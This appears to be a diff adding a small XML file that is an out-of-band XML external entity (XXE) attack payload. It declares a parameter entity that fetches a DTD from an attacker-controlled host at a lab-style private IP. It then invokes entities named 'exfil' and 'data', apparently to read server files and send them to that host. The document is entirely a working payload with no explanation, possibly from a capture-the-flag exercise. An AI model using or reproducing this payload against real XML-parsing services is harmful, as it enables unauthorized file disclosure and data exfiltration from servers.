@@ -1,0 +1,8 @@
+﻿<?xml version="1.0" ?>
+<!DOCTYPE message [
+<!ELEMENT message ANY >
+    <!ENTITY % ext SYSTEM "http://10.10.14.28/patents/ext.dtd">
+    %ext;
+    %param1;
+]>
+<message>&exfil;&data;</message>
